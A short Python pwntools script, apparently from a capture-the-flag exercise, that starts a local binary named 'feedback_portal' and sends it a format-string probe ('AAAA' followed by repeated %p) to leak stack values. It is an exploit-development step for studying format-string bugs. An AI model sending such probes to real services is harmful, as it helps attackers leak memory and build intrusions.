from pwn import *

for i in range(0,1):
    context.log_level = 'error'
    context.binary = elf = ELF('./feedback_portal', checksec=False)
    p=process(elf.path)
    p.sendline(f"AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p".encode())
    print(p.recv().decode())
    p.close()